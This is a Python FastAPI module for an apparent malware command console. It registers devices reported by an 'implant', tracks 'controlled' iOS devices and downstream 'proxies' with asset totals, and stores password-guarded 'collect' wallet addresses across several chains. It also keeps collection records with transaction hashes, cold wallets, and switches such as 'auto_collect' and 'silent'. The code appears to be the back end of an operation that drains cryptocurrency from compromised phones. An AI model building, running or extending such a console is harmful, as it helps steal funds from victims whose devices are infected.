"""
Console CRUD — devices, proxies, collect addresses, records, cold wallets,
and global control settings backed by SQLite.
"""

from __future__ import annotations

import json
import os
import time
import uuid

from typing import Any, Optional

from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel, Field

from .audit import audit
from .auth import require_console_user
from .database import (
    delete_cold_address,
    delete_device,
    delete_proxy,
    get_collect_addresses,
    get_collect_records,
    get_cold_addresses,
    get_device_by_id,
    get_device_stats,
    get_devices,
    get_proxies,
    get_proxy_descendant_ids,
    get_setting,
    save_collect_addresses,
    save_collect_record,
    save_cold_address,
    save_device,
    save_proxy,
    save_setting,
)
from .state import app_state

router = APIRouter(tags=["Console CRUD"])

COLLECT_GUARD_DEFAULT = "${CORUNA_CONSOLE_PASS}"
GLOBAL_CONTROL_DEFAULTS = {
    "auto_collect": True,
    "silent": False,
    "heartbeat": True,
    "proxy_forward": False,
    "log_report": True,
    "controlled_filter": False,
}


def _collect_guard_secret() -> str:
    return os.environ.get("COLLECT_GUARD_PASS", COLLECT_GUARD_DEFAULT)


def verify_collect_password(password: str) -> bool:
    return password == _collect_guard_secret()


def load_global_control() -> dict:
    raw = get_setting("global_control", json.dumps(GLOBAL_CONTROL_DEFAULTS))
    try:
        data = json.loads(raw)
    except json.JSONDecodeError:
        data = {}
    merged = dict(GLOBAL_CONTROL_DEFAULTS)
    merged.update({k: bool(v) for k, v in data.items() if k in merged})
    app_state.global_control = merged
    return merged


def save_global_control(data: dict) -> dict:
    merged = dict(GLOBAL_CONTROL_DEFAULTS)
    merged.update({k: bool(data.get(k, merged[k])) for k in merged})
    save_setting("global_control", json.dumps(merged))
    app_state.global_control = merged
    return merged


def is_log_report_enabled() -> bool:
    if not hasattr(app_state, "global_control") or not app_state.global_control:
        load_global_control()
    return bool(app_state.global_control.get("log_report", True))


def upsert_device_from_implant(
    *,
    device_id: str,
    session_id: str,
    ip: str,
    ios_version: str,
    visitor_id: str = "",
    name: str = "",
    host: str = "",
    port: str = "",
    proxy_id: str = "",
) -> dict:
    existing = get_device_by_id(device_id)
    payload = {
        "device_id": device_id,
        "name": name or (existing or {}).get("name", device_id),
        "host": host or ip,
        "port": port or (existing or {}).get("port", ""),
        "ip": ip,
        "uid": device_id,
        "ios_version": ios_version,
        "domain": (existing or {}).get("domain", ""),
        "tasks": (existing or {}).get("tasks", 0),
        "threads": (existing or {}).get("threads", 1),
        "controlled": True,
        "authorized": (existing or {}).get("authorized", False),
        "collectable": (existing or {}).get("collectable", True),
        "visitor_id": visitor_id or (existing or {}).get("visitor_id", ""),
        "session_id": session_id,
        "note": (existing or {}).get("note", ""),
        "proxy_id": proxy_id or (existing or {}).get("proxy_id", ""),
        "created_at": (existing or {}).get("created_at", time.time()),
        "updated_at": time.time(),
    }
    save_device(payload)
    return payload


# ── Models ───────────────────────────────────────────────────────────────────

class DeviceIn(BaseModel):
    name: str = ""
    host: str = ""
    port: str = ""
    ip: str = ""
    uid: str = ""
    ios_version: str = "iOS 17.6"
    domain: str = ""
    tasks: int = 0
    threads: int = 1
    controlled: bool = True
    authorized: bool = False
    collectable: bool = True
    visitor_id: str = ""
    session_id: str = ""
    note: str = ""


class DeviceUpdate(BaseModel):
    name: Optional[str] = None
    host: Optional[str] = None
    port: Optional[str] = None
    ip: Optional[str] = None
    uid: Optional[str] = None
    ios_version: Optional[str] = None
    domain: Optional[str] = None
    tasks: Optional[int] = None
    threads: Optional[int] = None
    controlled: Optional[bool] = None
    authorized: Optional[bool] = None
    collectable: Optional[bool] = None
    note: Optional[str] = None


class ProxyIn(BaseModel):
    name: str
    device_count: int = 0
    total_assets: float = 0
    status: str = "active"
    note: str = ""


class ProxyUpdate(BaseModel):
    name: Optional[str] = None
    device_count: Optional[int] = None
    total_assets: Optional[float] = None
    status: Optional[str] = None
    note: Optional[str] = None


class CollectAddressesUpdate(BaseModel):
    password: str
    trx_usdt: str = ""
    eth_usdc: str = ""
    btc: str = ""
    eth_usdt: str = ""
    eth_native: str = ""
    trx_native: str = ""
    bsc_usdt: str = ""
    bsc_native: str = ""
    sol_usdt: str = ""
    sol_native: str = ""


class ColdAddressIn(BaseModel):
    chain: str
    address: str
    label: str = ""
    balance: float = 0


class GlobalControlUpdate(BaseModel):
    auto_collect: Optional[bool] = None
    silent: Optional[bool] = None
    heartbeat: Optional[bool] = None
    proxy_forward: Optional[bool] = None
    log_report: Optional[bool] = None
    controlled_filter: Optional[bool] = None


def _device_out(row: dict) -> dict:
    return {
        "id": row.get("device_id", ""),
        "device_id": row.get("device_id", ""),
        "name": row.get("name", ""),
        "host": row.get("host", ""),
        "port": row.get("port", ""),
        "ip": row.get("ip", ""),
        "uid": row.get("uid", row.get("device_id", "")),
        "version": row.get("ios_version", ""),
        "ios_version": row.get("ios_version", ""),
        "domain": row.get("domain", ""),
        "tasks": row.get("tasks", 0),
        "threads": row.get("threads", 1),
        "controlled": row.get("controlled", False),
        "authorized": row.get("authorized", False),
        "collectable": row.get("collectable", False),
        "visitor_id": row.get("visitor_id", ""),
        "session_id": row.get("session_id", ""),
        "note": row.get("note", ""),
        "created_at": row.get("created_at", 0),
        "updated_at": row.get("updated_at", 0),
        "proxy_id": row.get("proxy_id", ""),
    }


def _device_scope_ids(request: Request) -> Optional[list[str]]:
    auth = require_console_user(request)
    if auth.get("role") == "admin":
        return None
    proxy_id = auth.get("proxy_id", "")
    if not proxy_id:
        return []
    return get_proxy_descendant_ids(proxy_id)


def _ensure_device_scope(request: Request, device_id: str) -> dict:
    device = get_device_by_id(device_id)
    if not device:
        raise HTTPException(404, "Device not found")
    scope = _device_scope_ids(request)
    if scope is not None and device.get("proxy_id", "") not in scope:
        raise HTTPException(403, "Device out of scope")
    return device


# ── Devices ──────────────────────────────────────────────────────────────────

@router.get("/api/devices", summary="List console devices")
async def list_devices(
    request: Request,
    authorized: Optional[bool] = None,
    collectable: Optional[bool] = None,
    controlled: Optional[bool] = None,
):
    proxy_scope = _device_scope_ids(request)
    rows = get_devices(
        authorized=authorized,
        collectable=collectable,
        controlled=controlled,
        proxy_ids=proxy_scope,
    )
    stats = get_device_stats()
    return {
        "code": 0,
        "data": {
            "devices": [_device_out(r) for r in rows],
            "stats": stats,
        },
    }


@router.post("/api/devices", summary="Create console device")
async def create_device(body: DeviceIn):
    device_id = body.uid or f"DEV-{uuid.uuid4().hex[:8].upper()}"
    if get_device_by_id(device_id):
        raise HTTPException(409, "Device already exists")
    payload = body.model_dump()
    payload.update({
        "device_id": device_id,
        "uid": device_id,
        "created_at": time.time(),
        "updated_at": time.time(),
    })
    save_device(payload)
    return {"code": 0, "data": _device_out(get_device_by_id(device_id) or payload)}


@router.put("/api/devices/{device_id}", summary="Update console device")
async def update_device(device_id: str, body: DeviceUpdate, request: Request):
    existing = _ensure_device_scope(request, device_id)
    for key, val in body.model_dump(exclude_unset=True).items():
        if val is not None:
            existing[key] = val
    existing["updated_at"] = time.time()
    save_device(existing)
    return {"code": 0, "data": _device_out(get_device_by_id(device_id) or existing)}


@router.delete("/api/devices/{device_id}", summary="Delete console device")
async def remove_device(device_id: str, request: Request):
    _ensure_device_scope(request, device_id)
    if not delete_device(device_id):
        raise HTTPException(404, "Device not found")
    return {"code": 0, "msg": "deleted"}


# ── Proxies ──────────────────────────────────────────────────────────────────

@router.get("/api/proxies", summary="List downstream proxies")
async def list_proxies():
    rows = get_proxies()
    total_devices = sum(r.get("device_count", 0) for r in rows)
    total_assets = sum(r.get("total_assets", 0) for r in rows)
    return {
        "code": 0,
        "data": {
            "proxies": [
                {
                    "id": r.get("proxy_id", ""),
                    "proxy_id": r.get("proxy_id", ""),
                    "name": r.get("name", ""),
                    "deviceCount": r.get("device_count", 0),
                    "totalAssets": r.get("total_assets", 0),
                    "status": r.get("status", "active"),
                    "note": r.get("note", ""),
                    "last_check_at": r.get("last_check_at", 0),
                    "createdAt": time.strftime(
                        "%Y-%m-%d",
                        time.localtime(r.get("created_at", time.time())),
                    ),
                }
                for r in rows
            ],
            "stats": {
                "count": len(rows),
                "total_devices": total_devices,
                "total_assets": total_assets,
            },
        },
    }


@router.post("/api/proxies", summary="Create proxy")
async def create_proxy(body: ProxyIn):
    proxy_id = f"PX-{uuid.uuid4().hex[:8]}"
    save_proxy({
        "proxy_id": proxy_id,
        "name": body.name,
        "device_count": body.device_count,
        "total_assets": body.total_assets,
        "status": body.status,
        "note": body.note,
        "created_at": time.time(),
    })
    return {"code": 0, "data": {"proxy_id": proxy_id}}


@router.put("/api/proxies/{proxy_id}", summary="Update proxy")
async def update_proxy(proxy_id: str, body: ProxyUpdate):
    rows = [r for r in get_proxies() if r.get("proxy_id") == proxy_id]
    if not rows:
        raise HTTPException(404, "Proxy not found")
    row = rows[0]
    for key, val in body.model_dump(exclude_unset=True).items():
        if val is not None:
            row[key] = val
    save_proxy(row)
    return {"code": 0, "msg": "updated"}


@router.delete("/api/proxies/{proxy_id}", summary="Delete proxy")
async def remove_proxy(proxy_id: str):
    if not delete_proxy(proxy_id):
        raise HTTPException(404, "Proxy not found")
    return {"code": 0, "msg": "deleted"}


# ── Collect ──────────────────────────────────────────────────────────────────

@router.get("/api/collect/addresses", summary="Get collect addresses")
async def get_collect_addrs():
    from .collect_catalog import COLLECT_ASSETS
    addrs = get_collect_addresses()
    updated = addrs.get("updated_at", 0)
    updated_str = (
        time.strftime("%Y-%m-%d %H:%M", time.localtime(updated))
        if updated else "—"
    )
    data = {
        "updatedAt": updated_str,
        "catalog": COLLECT_ASSETS,
    }
    for asset in COLLECT_ASSETS:
        data[asset["dest_key"]] = addrs.get(asset["dest_key"], "")
    data["trxUsdt"] = addrs.get("trx_usdt", "")
    data["ethUsdc"] = addrs.get("eth_usdc", "")
    data["btc"] = addrs.get("btc", "")
    return {"code": 0, "data": data}


@router.put("/api/collect/addresses", summary="Update collect addresses")
async def put_collect_addrs(body: CollectAddressesUpdate):
    if not verify_collect_password(body.password):
        raise HTTPException(403, "Invalid collect guard password")
    payload = body.model_dump(exclude={"password"})
    if not any(payload.values()):
        raise HTTPException(400, "At least one address required")
    save_collect_addresses(payload)
    audit("update_collect_addresses", "collect:addresses")
    return await get_collect_addrs()


@router.get("/api/collect/records", summary="List collect records")
async def list_collect_records(limit: int = 200):
    rows = get_collect_records(limit=limit)
    return {
        "code": 0,
        "data": [
            {
                "id": r.get("record_id", ""),
                "device_id": r.get("device_id", ""),
                "chain": r.get("chain", ""),
                "amount": r.get("amount", 0),
                "tx_hash": r.get("tx_hash", ""),
                "status": r.get("status", ""),
                "created_at": r.get("created_at", 0),
            }
            for r in rows
        ],
    }


@router.get("/api/collect/cold", summary="List cold addresses")
async def list_cold_addresses():
    rows = get_cold_addresses()
    return {
        "code": 0,
        "data": [
            {
                "id": r.get("cold_id", ""),
                "chain": r.get("chain", ""),
                "address": r.get("address", ""),
                "label": r.get("label", ""),
                "balance": r.get("balance", 0),
                "last_active": r.get("last_active", 0),
            }
            for r in rows
        ],
    }


@router.post("/api/collect/cold", summary="Add cold address")
async def add_cold_address(body: ColdAddressIn):
    cold_id = f"COLD-{uuid.uuid4().hex[:8]}"
    save_cold_address({
        "cold_id": cold_id,
        "chain": body.chain,
        "address": body.address,
        "label": body.label,
        "balance": body.balance,
        "last_active": time.time(),
        "created_at": time.time(),
    })
    return {"code": 0, "data": {"cold_id": cold_id}}


@router.delete("/api/collect/cold/{cold_id}", summary="Delete cold address")
async def remove_cold_address(cold_id: str):
    if not delete_cold_address(cold_id):
        raise HTTPException(404, "Cold address not found")
    return {"code": 0, "msg": "deleted"}


# ── Global control ───────────────────────────────────────────────────────────

@router.get("/api/settings/global-control", summary="Get global control switches")
async def get_global_control():
    data = load_global_control()
    return {"code": 0, "data": data}


@router.put("/api/settings/global-control", summary="Update global control switches")
async def put_global_control(body: GlobalControlUpdate):
    current = load_global_control()
    for key, val in body.model_dump(exclude_unset=True).items():
        if val is not None:
            current[key] = val
    saved = save_global_control(current)
    return {"code": 0, "data": saved}
